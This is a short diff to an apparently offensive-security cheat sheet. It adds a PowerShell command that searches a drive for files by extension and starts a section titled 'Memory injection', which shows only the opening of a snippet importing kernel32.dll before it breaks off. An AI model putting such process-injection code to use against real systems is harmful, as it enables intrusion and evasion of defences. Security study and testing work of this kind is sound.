@@ -21,6 +21,12 @@ mkdir mywebdav
 
 ### Powershell
 
+Find file:
+```
+Get-ChildItem -Path C:\ -Include *.extension -File -Recurse -ErrorAction SilentlyContinue
+```
+
+Memory injection
 ```
 $code = '
 [DllImport("kernel32.dll")]
